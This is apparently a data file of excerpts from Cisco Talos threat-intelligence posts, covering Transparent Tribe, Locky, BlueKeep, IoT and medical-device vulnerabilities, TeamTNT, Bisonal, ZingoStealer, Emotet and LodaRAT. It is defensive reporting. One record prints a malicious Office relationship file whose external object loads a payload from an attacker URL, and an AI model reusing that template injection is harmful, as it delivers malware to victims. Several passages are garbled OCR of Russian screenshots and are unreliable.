file-sharing websites. ", "source": "Cisco"}, {"title": "defense", "content": "Transparent Tribe has historically used military and defense-themes in their phishing emails and maldocs to target Indian military and government personnel. In one such case, we observed the group using the COVID-19 pandemic to target defense personnel. \nThe embedded XLS maldoc masquerades as a generic Health Advisory on COVID-19. This is in line with previous reporting on Transparent Tribe's use of official COVID-19 applications and content to serve Android malware. \nAnother lure targeted Indian Defense Advisors attached to various Indian embassies in Southeast Asia, as seen in Figure 8. \nThis lure consisted of a list of countries pertaining to one of the College of Defense Management's (CDM) study tours. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Transparent Tribe relies heavily on the use of maldocs to spread their Windows implants. \nWhile CrimsonRAT remains the group's staple Windows implant, their development and distribution of ObliqueRAT in early 2020 indicates they are rapidly expanding their Windows malware arsenal. Email and maldoc lures employed to spread these implants consist of multiple themes, including conference agendas, honeytrap lures and diplomatic themes. However, two common generic themes used consistently in their operations are fake resumes and military related topics. This indicates the group continues to primarily target defense personnel in the Indian subcontinent. Transparent Tribe uses generically themed contenthosting domains as well as malicious domains masquerading as legitimate defense-related websites. Coupled with the use of compromised websites to host malicious artifacts, this is evidence that the group is evolving their TTPs to appear more legitimate. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Nick Biasini \nFRIDAY, APRIL 21, 2017 14:42 \nTHREAT SPOTLIGHT\nThroughout the majority of 2016, Locky was the dominant ransomware in the threat landscape. It was an early pioneer when it came to using scripting formats Windows hosts would natively handle, like .js, .wsf, and .hta. These scripting formats acted as a vehicle to deliver the payload via email campaigns. However, late in 2016 Locky distribution declined dramatically largely due to the slowdown of Necurs that occurred at the same time. \nOn April 21st, Talos observed the first large scale Locky campaign in months from Necurs. This campaign leveraged techniques associated with a recent Dridex campaign and is currently being distributed in very high volumes. Talos has seen in excess of 35K emails in the last several hours associated with this newest wave of Locky. This large wave of distribution has been attributed to the Necurs botnet which, until recently, had been focused on more traditional spam such as pump-and-dump spam, Russian dating spam, and work-from-home spam. ", "source": "Cisco"}, {"title": "IOC", "content": "ffebb94676c767fb2cbd86453e3127f7abf459c428f2d80228f2cd7e1b55fff3 ca5c4d2bb3c6c035bb0137504b17ccec31deb366757440feb832b7e0d270b487 44687edc7169d919ef0891e41487ddefa30d93744d6a9e3ecabb5d6f8d88c039 d6aa22aee572dd90161ba793b8afba27dbf50df4d23b2921d131626671e8d966 8476cf9307933499771186dfe4c397905ea2a320c488b357ba0148f862b9532e 1705d38d2ea80177963d67fd18e836326d70a239378d6b9c74d445c5e0b423d6 3ccef773a5527c7128987bb8d359726f0b3d4d84dd6526c1b3aa76fd98b68539 6eaeb3aa26dcce83342eb2ed055c623ae43c629eccd7f1d31c0380029ed9741d \n65e5a0956b7e83e484b0fce962e08f1d75aefb0232d1521c97e186a746aabd2f 9008ee571b139496190f4e54d155300a1c875a8fb9096cfa27809e4e71955176 1b15c90d67e4b7522ca61e21133b155eb7f1cf32328a030784dc2d95ee7d10ad 32324fe312aba53c25a512eb81f7fe6ab7b2a44417a0cd0983c6f19cd29d5b26 1b025b5f24d42eed4eabaff15cee80fff3484d4205be2611f8dce5d4dce9020c 7e69993bfe292a72f8377d47059741f2b9ef2df1c93b2a0457ed8c1acf986e70 69ac4202505b603b490e5f2ca4e310af57a16c6c3f9a2efa928ab0d0faf7ae6b 1fc5a5831c2d880fc5e32db55adef8ad1e0f68b8e245ccaf1a3ee78f83a7da27 e4426738a8ed366f2773aa3ac9374dae6f3ad41759dd3227a8d025fac2af9b49 a0b01d5f3f41b49e07be198408910084912cc5db030aa4d0449a8bd2677596b3 06d42acee69178a161b7317c87515e4bdab647976985a1d172411b799ffbac32 eb9c6616204c358aa06ebb181cfcf8220216a9531b05006e8ed5dd714f3574da 7e73b086c5d0d693483a57847aa738e8c3b65b45f8603b5980721795af4534dd 7a6052881573bb7d976a5bbf39e1a9221dea68193f27c142bb77534a5049e5b9 f08ab6e0fc6dbff270b2d42f4412375cef3d543b311923960ab432d35754a56e 63fc82ce40ea946749e7312517b103fad96e8da6a01c63e44be93cd196aae692 2592d4bf18d83d1b9f98176ce389d6ad5dcaa399f3a549fab15cad520cd24470 5e9f7cae76f9888c732a77345326e442f56d94e8ed253eabb812fc2ba95e01ca ff92433ae4ee90b3c6dd3cd5655302be345addd2a57bf143ee982e692ca7ca33 2881600b108ece9a1df3e7659370e3ee79cf233e9723a9acd7985452c5915eb3 f1326f8c348b6a4eb0fe0c3fcdc27e8375fd0ea7ecca54d392de790f31a9d037 cd0a031a65a10e8c549c29c1b5db87ad730c84ef9ba48041b3c4a723e56ee71f 8e2cb05dbf3375e66488f387aaebe31c51c95fea135eadace186362629988a4c 0559d32f6a20cdfa380eb1eb17fbc4aea9e39f3203f4b7818281e0fb117a6977 32325761402e0b55dd9fe8b2718bc213491eea6f57bc354e358a6edcbe584dd1 ", "source": "Cisco"}, {"title": "Conclusion", "content": "Ransomware's monetary draw has continued to push it to the forefront of the threat landscape. Locky had prolific distribution for the majority of 2016, but has been largely absent for 2017. This could be the first significant wave of Locky distribution in 2017. The payload hasn't changed but they methodology has; the use of PDFs requiring user interaction was recently seen by Dridex and has now been co-opted into Locky. This is an effective technique to defeat sandboxes that do not allow user interaction and could increase the likelihood of it reaching an end user's mailbox. \nAdversaries will continue to evolve to try and maximize their profits. This is just another example in a long line of evolution that email based malware delivery has gone through. For a time PDF based compromise was down significantly and word macro based compromise up. In this campaign they figured out how to disguise a macro laden word doc in a PDF, compromising victims around the globe. ", "source": "Cisco"}, {"title": "Introduction", "content": "B Nick Biasini \nFRIDAY, MAY 31, 2019 16:23 \nThis blog was authored by Brandon Stultz \nMicrosoft recently released fixes for a critical pre-authentication remote code execution vulnerability in Remote Desktop Protocol Services (RDP). Identified as CVE-2019-0708 in May's Patch Tuesday, the vulnerability caught the attention of researchers and the media due to the fact that it was \"wormable,\" meaning an attack exploiting this vulnerability could easily spread from \none machine to another. This was discussed at length in episode 54 of our 'Beers with Talos' podcast. \nCisco Talos started reverse-engineering work immediately to determine how exactly RDP was vulnerable. Talos wrote and released coverage as soon as we were able to determine the vulnerability condition. SID 50137 for SNORT\u00ae correctly blocks exploitation of CVE-2019-0708 and scanning attempts that leverage this vulnerability. \nThis rule prevents exploitation of CVE-2019-0708 by blocking any RDP connection that attempts to use the \"MS_T120\" virtual channel. The RDP protocol defines virtual channels that can be used to transfer different kinds of data (e.g. clipboard, audio, etc.). In addition to these client-specified channels, Microsoft creates the \"MS_T120\" channel in the Windows RDP system. Clients are not expected to create the \"MS_T120\" channel. A remote unauthenticated attacker can exploit CVE2019-0708 by sending crafted data to this internal channel. \nSince RDP servers are not aware of which virtual channels the client supports, the client provides a list of desired channels in the connect-initial packet at the start of the RDP session. \nClient --> Connection Request --> Server Client <-- Connection Confirm <-- Server -- Optionally switch transport to TLS -- Client --> MCS connect-initial --> Server Client <-- MCS connect-response <-- Server \nIt is possible to specify in the RDP connection request that the client is TLS capable. In most cases, this causes the server to switch the connection to TLS after the Connection Confirm packet. This means that Cisco Firepower will only scan the virtual channel list in the encrypted case if TLS decryption is set up for RDP. \nWhile the aforementioned Snort rule can help protect against BlueKeep, it is still possible for attackers to carry out an encrypted attack - essentially sneaking past users and remaining undetected. Unless users set up TLS decryption for RDP on their Firepower device, there is a chance an attacker could exploit CVE-2019-0708 to deliver malware that would have the potential to spread rapidly. \nThe following is a guide to set up RDP decryption on Cisco Firepower. This guide specifically applies to Windows Server 2008 instances (newer versions of Windows Server are not vulnerable to BlueKeep). Additionally, Windows 7 only allows setting up a custom RDP certificate in the registry. It is possible to export the self-signed RDP certificate and private key in Windows 7 but this requires using the mimikatz tool as the private key for the auto-generated certificate is marked as \"not exportable\". Considering these hurdles, we focused on Windows Server 2008 for this guide. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Over the last several years we have seen several high profile vulnerabilities affecting services associated with various Windows services. Some, if not all, of these services should not be exposed to the internet. To reduce external exposure organizations need to take additional steps to ensure that services like RDP and SMB are not exposed unless explicitly required, but does not eliminate the need for patching. This is yet another example of why patching is one of the core fundamental concepts in information security. Vulnerabilities this severe appear periodically, and organizations need to be prepared to respond in a variety of different ways. Patching takes time and making sure that you have detection and prevention in place can require varying levels of difficulty. In this particular example, in order to get a higher level of visibility, SSL decryption is required for more thorough protections. \nAs encryption becomes more ingrained in the internet and more applications take advantage of it, these types of steps are going to become more common. Adversaries are always going to look for ways to evade any type of detection and using encryption is a great way to evade some of these technologies. Regardless, Cisco Talos will always be looking at the ways adversaries are operating and developing new and clever techniques to defeat them. \nSHARE THIS POST ", "source": "Cisco"}, {"title": "Introduction", "content": "By William Largent \nWEDNESDAY, OCTOBER 31, 2018 16:18\nVULNERABILITY SPOTLIGHT\nVulnerabilities Discovered by Lilith [x_x] of Cisco Talos. \nOverview   \nCisco Talos is disclosing multiple vulnerabilities in the firmware of the Yi Technology Home Camera. In order to prevent the exploitation of these vulnerabilities, Talos worked with Yi Technology to make sure a newer   \nversion of the firmware is available to users. These   \nvulnerabilities could allow an attacker to gain remote code execution on the devices via a command injection, bypass methods of network authentication, or disable the device. \nThe Yi Home Camera is an internet-of-things (IoT) home camera sold globally. The 27US version is one of the newer models sold in the U.S. and is the most basic model out of the Yi Technology camera lineup. \nIt includes all the functions that one would expect from an IoT device, including the ability to view the camera's feed from anywhere, offline storage, subscription-based cloud storage and easy setup. \nThere are many consequences to a security vulnerability within the firmware of this security camera. An attacker could exploit these vulnerabilities to: \nDisable the camera to prevent it from recording.   \nDelete stored videos on the camera.   \nView video feeds from the camera.   \nPotentially launch attacks against the camera owner's phone app.   \nAct as a foothold into the home network to attack other devices inside. \nThis list is not complete, and many other consequences could occur, so Talos highly recommends that the devices are patched as soon as possible via the Yi Home application. ", "source": "Cisco"}, {"title": "Conclusion", "content": "With the increased convenience of IoT devices, a new set of attack vectors arose that have not been as hardened as traditional ones. As such, Talos recommends that users apply these newly available firmware updates in order to ensure their continued and secure operation. This can be done via the Yi Home phone app, which will notify the user of this new firmware upon being opened. It is also recommended that the user checks the device's firmware version after the update, via the phone app, in order to ensure that the update did in fact occur. ", "source": "Cisco"}, {"title": "Introduction", "content": "<?xml version=\"1.0\"?> <Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship I d=\"rId3\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/settings\" Target =\"settings.xml\"/><Relationship Id=\"rId2\" Type=\"http://schemas.microsoft.com/office/20o7/relationshi ps/stylesWithEffects\" Target=\"stylesWithEffects.xml\"/><Relationship Id=\"rIdl\" Type=\"http://schemas. openxmlformats.org/officeDocument/2006/relationships/styles\" Target=\"styles.xml\"/><Relationship Id= \"rId6\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/theme\" Target=\"the me/themel.xml\"/><Relationship Id=\"rId5\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006 /relationships/fontTable\" Target=\"fontTable.xml\"/><Relationship Id=\"rId4\" Type=\"http://schemas.open xmlformats.org/officeDocument/2006/relationships/webSettings\" Target=\"webSettings.xml\"/><Relationsh ip Id=\"_id_1909\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/ole0bjec t\" TargetMode=\"External\"Target=\"http://avast.dongguanmolds.com/plugins.wbk\"/></Relationships> ", "source": "Cisco"}, {"title": "Conclusion", "content": "This is a highly effective malware campaign that is able to avoid detection by most antivirus applications. Therefore, it is necessary to have additional tools such as Threat Grid to defend your organization from these kinds of threats. \nThe actor behind this malware used the RTF standard because of its complexity, and used a modified exploit of a Microsoft Office vulnerability to download Agent Tesla and other malware. It is not completely clear if the actor changed the exploit manually, or if they used a tool to produce the shellcode. Either way, this shows that the actor or their tools have ability to modify the assembler code in such a way that the resulting opcode bytes look completely different, but still exploit the same vulnerability. This is a technique that could very well be used to deploy other malware in a stealthy way in the future. ", "source": "Cisco"}, {"title": "Introduction", "content": "TeamTNT is actively modifying its scripts after they were made public by security researchers.   \nThese scripts primarily target Amazon Web Services, but can also run in on-premise, container, or other forms of Linux instances.   \nThe group's payloads include credential stealers, cryptocurrency miners, persistence and lateral movement.   \nTeamTNT scripts are also capable of disabling cloud security tools, such as Alibaba's aegis cloud security agent. ", "source": "Cisco"}, {"title": "Detection", "content": "TeamTNT sets the CPU utilization to 70%, so an Amazon CloudWatch Alarm could be configured for ongoing steady utilization of exactly $7\\textcircled{1}\\textcircled{2}$ depending on the use case of the account and whether that is common for benign reasons. Similarly, the sudden creation or expansion of an Elastic Block Store (EBS) volume mounted to an EC2 instance to an unusual amount of utilized space may indicate a full blockchain has been downloaded, which some cryptominers perform. Of course, the defense impairment techniques themselves can be detected. At a simplistic level, if monitoring agents such as aegis unexpectedly go offline, that is concerning. Cisco Secure Cloud Analytics has a substantial amount of additional monitoring around various defense impairment techniques, but it is focused on AWS and Azure services - not Alibaba Cloud Security. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Cybercriminals who are outed by security researchers must update their tools in order to continue to operate successfully. As defenders, we can learn a lot from the updates made by these cybercriminals. The tools used by TeamTNT demonstrate that cybercriminals are increasingly comfortable attacking modern environments such as Docker, Kubernetes and public cloud providers, which have traditionally been avoided by other cybercriminals who have instead focused on on-premise or mobile environments. Successfully deploying malware in these modern environments requires cybercriminals to get creative when it comes to avoiding detection, as we can see from TeamTNT's efforts to disable cloud security services. Network defenders must also get creative when it comes to implementing new forms of detection and monitoring if we are to ensure the ongoing security of these systems. ", "source": "Cisco"}, {"title": "Introduction", "content": "Security researchers detected and exposed the Bisonal malware over the past 10 years. But the Tonto team, the threat actor behind it, didn't stop.   \nThe victimology didn't change over time, either. Japanese, South Korean and Russian organizations were the prime targets for this threat actor. \nhttps://blog.talosintelligence.com/bisonal-10-years-of-play/ \nWhat's new? Bisonal is a remote access trojan (RAT) that's part of the Tonto Team arsenal. The peculiarity of the RAT is that it's been in use for more than 10 years - this is an uncommon and long period for malware. Over the years, it has evolved and adapted mechanisms to avoid detection while keeping the core of its RAT the same. We identified specific functions here for more than six years. \nHow did it work? Bisonal used multiple lure documents to entice their victims to open and then be infected with Bisonal malware. This group has continued its operations for over a decade and they continue to evolve their malware to avoid detection. Bisonal primarily used spear phishing to obtain a foothold within their victims' networks. Their campaigns had very specific targets which would suggest their end game was more around operational intelligence gathering and espionage. \nSo what? This is an extremely experienced group likely to keep their activities even after exposure, even if we identified mistakes and bad copy/paste, they are doing this job for more than 10 years. We think that exposing this malware, explaining the behavior and the campaigns where Bisonal was used is important to protect the potential future targets. The targets to this point are located in the public and private sectors with a focus on Russia, Japan and South Korea. We recommend the entities located in this area to prepare for this malware and actor and implement detections based on the technical details provided in this article. \nVictimology and campaigns   \nFrom our analysis and the intelligence shared by the community throughout the last decade of activities of Bisonal, we can conclude that the actor behind this malware is specifically targeted at the South East Asian region, namely Japan and Korea with another significant focus on Russian-speaking victims. \nWe identified a couple of decoy documents pointing to the victims. During the Heartbeat campaign documented in 2012 by Trend Micro, dating back to 2009, the attacker used Hangul Word Processor (HWP) decoy documents. This file format is mainly used in South Korea. The report mentioned political parties, media outfits, a national policy research institute, a military branch of South Korean armed forces, a small business sector organization and branches of the South Korean government. Later in 2018, Unit 42 released a Bisonal paper where we can see a spearphishing campaign in Russian and a decoy document alleged to be from Rostec, a Russian state-owned holding conglomerate headquartered in Moscow. \nFinally, in 2018, Ahnlab released a paper about \"Operation Bitter Biscuit\" where Bisonal was used against Korean and Japanese entities. India is also mentioned, but it was by another malware named \"Bioazih\" by Ahnlab. In this paper, the editor mentions targets such as manufacturers, defense industry and government. \nAdditionally, we can provide additional decoy documents. For example, a Korean document used in September 2014 where the title was \"Contact member and counselor of the Agriculture, Forestry, Livestock, Food and Marine Fisheries Committee:\" \nOr a Russian document about the CIPR Digital conference used in April 2018. This is an application document that has been used to provide a decoy to the Bisonal malware. This conference has some high-ranking government and business attendees. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The actor behind Bisonal is clearly motivated and has an interest in Russian, Korean and Japanese victims. The development of Bisonal has been active for more than a decade. We have observed the code evolving with the different publications but also with the evolution of Microsoft Windows. \nHowever, specific functions are still used today, many years after the original implementation of the Bional malware. Even if Bisonal could be considered as simple with less than 30 functions, it has spent its life targeting sensitive entities in both the public and private sectors. Some campaigns were even mentioned on mainstream media against military entities within the mentioned regions. \nDuring the decade of activities, we also can see mistakes and rollbacks from the attackers. For example, in one campaign they put the domain name of the C2 server in plaintext in the malware which had the function to generate a non-ASCII string for the C2 servers once decoded. In this condition, the malware cannot work on the compromised system. Even after so many years of activities, the attackers make mistakes. \nWe don't see any reason why this actor will stop in the near future. With this investigation and the analysis of this decade of activity, we hope to force this actor to innovate by providing a better understanding of his arsenal and more specifically how Bisonal works. \nCoverage   \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware used by these threat actors. Exploit Prevention present within AMP is designed to protect customers from unknown attacks such as this automatically. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), Cisco ISR, andMeraki MX can detect malicious activity associated with this threat. \nAMP Threat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network. \nOpen Source Snort Subscriber Rule Set customers can stay up to date by downloading the latest rule pack available for purchase on Snort.org. \nIOCs ", "source": "Cisco"}, {"title": "Introduction", "content": "Talos has discovered multiple vulnerabilities in Natus NeuroWorks software. This software is used in the Natus Xltek EEG medical products from Natus Medical Inc. The vulnerable devices contain an ethernet connection for data acquisition and connection to networks. \nWe identified a number of vulnerabilities falling into two classes: \nFour code execution vulnerabilities One denial of service vulnerability. \nThe first category allows code execution on the medical device through a specially crafted network packet. The second category can cause the vulnerable service to crash. The vulnerabilities can be triggered remotely without authentication. ", "source": "Cisco"}, {"title": "Conclusion", "content": "In accordance with our coordinated disclosure policy, Talos has worked with Natus to ensure that these issues have been resolved and that a firmware update is made available for affected customers. Several of these vulnerabilities could allow a remote attacker to execute arbitrary code on affected devices. Given the role these devices play and the environments in which they are typically deployed, it is highly recommended that they be evaluated and addressed by organizations as quickly as possible. Natus has released Neuroworks 8.5 GMA2 to address these issues. Talos recommends installing this update as quickly as possible on affected systems. \nCoverage \nThe following Snort rules will detect exploitation attempts. Note that additional rules may be released at a future date, and current rules are subject to change, pending additional vulnerability information. For the most current rule information, please refer to your FireSIGHT Management Center or Snort.org. \nSnort Rules: 43518, 43489 \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nTHURSDAY, APRIL 14, 2022 07:59 \nTHREAT SPOTLIGHT\nUpdate (04/14/22): Following the initial publication of this blog, we observed a new post in the Haskers Gang Telegram channel announcing that ownership of the ZingoStealer project is being transferred to a new threat actor. ", "source": "Cisco"}, {"title": "Introduction", "content": "In early March 2022, while monitoring the communications between members of Haskers Gang, we observed the announcement of the availability of a new information stealer called \"ZingoStealer.\" This new malware was advertised as being freely available to members of the Haskers Gang Telegram community. \nPenn36ecnnaTHorocTWnnepayxeHaBawNx3KpaHax! \nMbl paAbI npeACTaBNTb BaM Haw 6ecnnaTHbi nponyKT,KOTopbi MoxeT cBo6onHo KOHKypWpoBaTb CnpoyMMn npoeKTaMN-@ginzoStealer_bot \nCTonbKoBpeMeHcn6bInonOTpayeHOHe3pa,yHaCnOnyyWnocbCnenaTbAnBaCKaeCTBeHHblnpoeKT(MOxeTAa\\*eKayeCTBeHHee,yMnnaTHble aHanor Ha \u03a6opyMax) \nMboeHbnaroapHbBaM3aMOb,KCTaT,TaTHblxyHKpenTKa3aTbCepHyCncopyerebr.BceBac,Ca 6ecnnaTHO! \nO6panyiTe MeH9 Toxe,noctaBbTe peaKuMro non nocT \nUPD:A He 6epy npoueHToB/noroBc3Toro cTWnnepa;nor HWrAe He Ay6nupyIoTCA W HUKTo KpoMeBac He \u0418MeeT K HUM AocTyna \n02:orcCHnpWxonATo Texnop,nOKaMeH9HeBbe6yTOpraHbl,AaxeeCnN Bbe6yT-ABacyBenoMnooTOM,ToOTKnoyarooTCTyK \nZingoStealer release announcement. \nSince this announcement, we have observed a steady volume of ZingoStealer samples being uploaded to various malware repositories. \nThe malware is offered in two \"tiers\" of options, with both versions of the malware precompiled and delivered via a Telegram channel. \n3aKpunTOBaTb 6unn \n3aKpunToBaTb 6Wnn \nexoCrypt-3TO aBTOMaTHyecKW cepBNC,KOTopbI 3aKpWnTyeT Te6e \u03a6an 3a cyNTaHHble ceKyHAbl Ao nonHoro aHneTeKTa!(O/26) \n-KpWnTXWBeTAOnbWe,4eMyKOHKypeHTOBB3TOMLeHOBOMCerMeHTe \u4e00yHNKanN3WpyeMaBTOMaTHyecKNKaXAbIcTa6nepenKpNnTOM -rapaHTWpoBaHHoo6xoAnMWindowsDefenderHacKaHTaVMe \u4e00nonnepxnBaeM.Net,Native\u03a6anbl(x32&x6 -HaKNAbIBaeMcepTn\u03a6NKaTHaKaXAbl\u03a6an \nABTomatnyecKaA npona)xa:@exoCrypt_bot (onnata Qiwi) AAMNHNcTpaTopcepBNca:@xxtrez(noBceM BonpocaM) CToNMoCTboAHOrOKpNnTacoCTaBn9eTBCero3OOpy6nei! AKTyanbHbigeteKT:https://avcheck.net/id/DXdZNP6f1ZSu(0/26) \nZingoStealer and exoCrypt crypter integration. \nFor 300 Rubles (\\~\\$3 USD), Haskers Gang also offers a pre-built option that leverages their crypter, which they refer to as \"ExoCrypt.\" This allows affiliates to take advantage of antivirus evasion without requiring them to use a third-party builder to package the malware prior to distributing it. \nDuring our analysis of ZingoStealer, we observed the malware author behind the stealer incorporating the XMRig cryptocurrency mining software into the stealer to further monetize their efforts by using systems infected by affiliates to generate Monero for the malware author. \no6poeyTpo,AopornenoAnnwnyHnK ", "source": "Cisco"}, {"title": "Conclusion", "content": "ZingoStealer is a relatively new information stealer being offered for free to members of the Haskers Gang Telegram group. It features the ability to steal sensitive information from victims and can download additional malware to infected systems. In many cases, this includes the RedLine Stealer and an XMRig-based cryptocurrency mining malware that is internally referred to as \"ZingoMiner.\" While the malware is new, Cisco Talos has observed that it is undergoing consistent development and improvement and that the volume of new samples being observed in the wild continues to increase as more threat actors attempt to leverage it for nefarious purposes. In many of the distribution campaigns we have observed associated with ZingoStealer, threat actors appear to be targeting home users and distributing their malware under the guise of video game cracks, cheats, and other similar content. Users should be aware of the threats posed by these types of applications and should ensure that they are only executing applications distributed via legitimate mechanisms. ", "source": "Cisco"}, {"title": "Introduction", "content": "By Edmund Brumaghin \nWEDNESDAY, NOVEMBER 18, 2020 11:00\nTHREAT SPOTLIGHT\nBy Nick Biasini, Edmund Brumaghin, and Jaeson Schultz. \nEmotet is one of the most heavily distributed malware families today. Cisco Talos observes large quantities of Emotet emails being sent to individuals and organizations around the world on an almost daily basis. These emails are typically sent automatically by previously infected systems \nhttps://blog.talosintelligence.com/emotet-2020/ \nattempting to infect new systems with Emotet to continue growing the size of the botnets associated with this threat. Emotet is often the initial malware that is delivered as part of a multistage infection process and is not targeted in nature. Emotet has impacted systems in virtually every country on the planet over the past several years and often leads to high impact security incidents as the network access it provides to adversaries enables further attacks, such as biggame hunting and double-extortion ransomware attacks. \nCisco Talos obtained ownership of several domains that Emotet uses to send SMTP communications. We leveraged these domains to sinkhole email communications originating from the Emotet botnets for the purposes of observing the characteristics of these email campaigns over time and to gain additional insight into the scope and profile of Emotet infections and the organizations being impacted by this threat. Emotet has been observed taking extended breaks over the past few years, and 2020 was no exception. Let's take a look at what Emotet has been up to in 2020 and the effect it's had on the internet as a whole. ", "source": "Cisco"}, {"title": "Background", "content": "Emotet began its life as a banking trojan, but over the years, it evolved into what can now be classified as a highly modular threat that adversaries leverage for a variety of purposes. In recent years, it has often been used as a \"beachhead\" in victim networks as it provides initial access and long-term persistence that malicious adversaries can use to conduct further intrusion activities from within infected networks. In many cases, it is used as the initial payload in a multi-stage infection process and can be operational in victim networks for extended periods of time before adversaries choose to leverage the access it provides to further attack organization. This is an important consideration for network defenders as system backups may be compromised as a result of long-term infections that reside in systems in the environment. \nThere are several other malware families that are also often delivered alongside Emotet such as Trickbot, Qakbot and others. Many network-based ransomware incidents, such as those conducted by the operators of Ryuk ransomware, can be traced back to initial network access gained via Emotet. Over the past few years, Emotet has periodically taken breaks from sending spam messages, with periods of inactivity ranging from weeks to months in several cases. It is important to note that while these periods of inactivity correspond to lack of spam distribution, the botnets are typically still operational during these periods and as such, previously infected systems can still be leveraged for intrusions. \nOrganizations and network defenders should be aware of the threat posed by Emotet and ensure that they have strategies in place to prevent compromise, detect infections within their environments, and ensure that their backup and recovery strategies compensate for situations in which the malware may have been resident for extended periods prior to discovery. ", "source": "Cisco"}, {"title": "Conclusion", "content": "Emotet is a constantly evolving threat that poses risks to organizations all over the world. Large volumes of malicious spam emails generated by systems infected with Emotet are constantly being sent in an attempt to infect additional systems and provide persistent network access that can be used for a variety of nefarious purposes. Organizations should be aware of this threat as it continues to change over time and ensure that they have strategies in place to protect their environment from the impacts of successful infection. In many cases, Emotet is the initial stage of a multi-stage infection process that often features use of additional malware payloads. Since Emotet can be present in environments for extended periods of time prior to discovery by security teams, it is essential that organizations develop comprehensive backup and recovery strategies that can compensate for these situations prior to an incident occurring. This approach to cybercrime continues to be lucrative for cybercriminals and as such is likely not going away in the foreseeable future. Cisco Talos will continue to monitor this threat to ensure that customers remain protected as it continues to change and evolve over time. \nCoverage \nWays our customers can detect and block this threat are listed below. \nAdvanced Malware Protection (AMP) is ideally suited to prevent the execution of the malware detailed in this post. Below is a screenshot showing how AMP can protect customers from this threat. Try AMP for free here. \nCisco Cloud Web Security (CWS) or Web Security Appliance (WSA) web scanning prevents access to malicious websites and detects malware used in these attacks. \nEmail Security can block malicious emails sent by threat actors as part of their campaign. \nNetwork Security appliances such as Next-Generation Firewall (NGFW), Next-Generation Intrusion Prevention System (NGIPS), and Meraki MX can detect malicious activity associated with this threat. \nThreat Grid helps identify malicious binaries and build protection into all Cisco Security products. \nUmbrella, our secure internet gateway (SIG), blocks users from connecting to malicious domains, IPs and URLs, whether users are on or off the corporate network. \nAdditional protections with context to your specific environment and threat data are available from the Firepower Management Center. \nSHARE THIS POST \nRELATED CONTENT ", "source": "Cisco"}, {"title": "Introduction", "content": "By Vitor Ventura, Chris Neal, Warren Mercer \nTUESDAY, FEBRUARY 9, 2021 14:17 \nThe developers of LodaRAT have added Android as a targeted platform. \nA new iteration of LodaRAT for Windows has been identified with improved sound recording capabilities. \nThe operators behind LodaRAT tied to a specific campaign targeting Bangladesh, although others have been seen. \nKasablanca, the group behind LodaRAT, seems to be motivated by information gathering and espionage rather than direct financial gain. Threat actors attempt to evolve over time and the ones behind Loda are no different. Loda now has an Android version. Just like its Windows version, the Android version is also a remote access tool (RAT) with the features one would expect out of this kind of malware. This Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to the Loda developers and uncovered a full campaign targeting Bangladeshi users. This shows a resourceful adversary evolving their toolkit into other platforms. It is unclear if the campaign operators are the same as the developers, but there is no doubt they must work closely together. To protect against this actor, each individual in an organization must be careful with documents attached to emails and be vigilant before clicking on links. Organizations can protect themselves by monitoring domains resolutions using Umbrella, for instance, and protecting endpoints using Cisco AMP. \nWhat's new? \nLodaRAT operators and/or developers now have a new tool, Loda4Android. This new malware follows the same principles of other Android-based RATs that we have seen on the threat landscape. Along with this new Android variant, an updated version of Loda for Windows has been identified in the same campaign. These new versions for Loda4Windows and Loda4Android show that the development effort is clearly carried out by the same group we are calling \"Kasablanca.\" \nHow did it work? \nTalos identified hybrid campaigns targeting Windows and Android users. The authors developed an Android-based RAT following the same principles as other RATs. However, they specifically avoided techniques often used by banking trojans, like the Accessibility APIs. The underlying command and control (C2) protocol follows the same design pattern as the Windows version, suggesting that the C2 code will handle both versions. Talos researchers have found both reversions reporting to the same C2 hostname and port, further confirming our assertions. \nSo what? \nThe fact that the threat group has moved into hybrid campaigns targeting Windows and Android shows a group that is thriving and evolving. Giving that there are indications that the group using LodaRAT is looking for direct financial gain (there is no related ransomware or banking activity), organizations and individuals should be aware of this threat group. ", "source": "Cisco"}, {"title": "Conclusion", "content": "The threat actor behind Loda is diversifying its target platforms and continuously improving functionality. Along with these improvements, the threat actor has now focused on specific targets, indicating more mature operational capabilities. As is the case with earlier versions of Loda, both versions of this new iteration pose a serious threat, as they can lead to a significant data breach or heavy financial loss. The group has decided to deploy a cross-platform malware with some additional capabilities, suggesting they have their eyes on targeting larger organizations over time. As always we encourage users to be vigilant when they're clicking on or opening any links via email or SMS message. This actor has made use of squatted domains to try and preserve some legitimacy however, as detailed, these are made to look familiar to the real domains to try and lure the user in without noticing. ", "source": "Cisco"}, {"title": "Introduction", "content": "The rise of ransomware over the past year is an ever growing problem. Businesses often believe that paying the ransom is the most cost effective way of getting their data back - and this may \nhttps://blog.talosintelligence.com/ransomware-history-past-prologue/ \nalso be the reality. The problem we face is that every single business that pays to recover their files, is directly funding the development of the next generation of ransomware. As a result of this we're seeing ransomware evolve at an alarming rate. \nIn this blog post we explore traits of highly effective strains of self-propagating malware of the past, as well as advances in tools to facilitate lateral movement. This research is important as we expect adversaries to begin utilizing these capabilities in ransomware going forward. This blog post focuses on two avenues of thought - that our past is chock full of successful malware, and that successful cyber extortionists will look to the past to create new and evolving threats going forward. \nRansomware as we know it today has a sort of 'spray and pray' mentality; they hit as many individual targets as they can as quickly as possible. Typically, payloads are delivered via exploit kits or mass phishing campaigns. Recently a number of scattered ransomware campaigns deliberately targeting enterprise networks, have come to light. We believe that this is a harbinger of what's to come 